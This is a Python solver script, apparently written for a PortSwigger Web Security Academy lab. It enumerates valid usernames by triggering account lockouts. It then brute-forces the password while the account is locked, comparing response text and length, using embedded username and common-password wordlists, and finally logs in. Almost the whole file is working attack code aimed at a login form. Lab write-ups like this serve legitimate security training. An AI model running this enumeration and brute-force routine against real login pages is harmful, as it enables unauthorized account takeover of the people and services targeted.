#!/usr/bin/env python3
"""
Username enumeration via account lock
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 05-username-enumeration-via-account-lock.md

What this does:
    Stage one: for each candidate username, fires up to five wrong-password
    attempts in a row and watches for the lockout phrase "too many"/"locked"/
    "block" -- only real accounts lock, so the first username whose responses
    flip to that language is confirmed valid. Stage two abuses a logic flaw in
    the lock itself: while the account is still locked, submitting the correct
    password produces a response that's neither the lockout message nor a normal
    "incorrect password" error. The script captures a lockout baseline and then
    sweeps the password list looking for that third kind of response -- finding
    the real password while the account is still locked and login is blocked.
    Finally it waits out the lockout window and logs in normally.

Usage:
    python 05-username-enumeration-via-account-lock.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

USERNAMES = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover",
]

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Stage 1: triggering lockout per candidate username...")
    found_user = None
    for uname in USERNAMES:
        locked = False
        for _ in range(5):
            page = client.get(f"{lab_url}/login")
            resp = client.post(f"{lab_url}/login", data={
                "csrf": _csrf(page.text), "username": uname, "password": "wrong_pw_xyz"
            })
            txt = resp.text.lower()
            if "too many" in txt or "locked" in txt or "block" in txt:
                locked = True
                break
        if locked:
            found_user = uname
            print(f"[+] Username found (lock): {uname}")
            break

    if not found_user:
        print("[-] No username found via lockout.")
        return

    print(f"[*] Stage 2: brute-forcing password during lockout for {found_user}...")
    page = client.get(f"{lab_url}/login")
    lock_resp = client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": found_user, "password": "definitely_wrong_xyz"
    })
    lock_len = len(lock_resp.text)
    print(f"[*] Lock baseline length: {lock_len}")

    found_pw = None
    for pw in PASSWORDS:
        page = client.get(f"{lab_url}/login")
        resp = client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": found_user, "password": pw
        })
        txt = resp.text.lower()
        if "too many" not in txt and "locked" not in txt and "block" not in txt:
            if "incorrect" not in txt and "invalid" not in txt:
                print(f"[+] Password found (no error during lock): {pw}")
                found_pw = pw
                break
        if abs(len(resp.text) - lock_len) > 10:
            if "incorrect" not in txt and "invalid" not in txt:
                print(f"[+] Password found (length diff during lock): {pw}")
                found_pw = pw
                break

    if not found_pw:
        print("[-] No password matched from the candidate list.")
        return

    print("[*] Waiting 60s for account unlock...")
    time.sleep(60)

    page = client.get(f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": found_user, "password": found_pw
    })

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
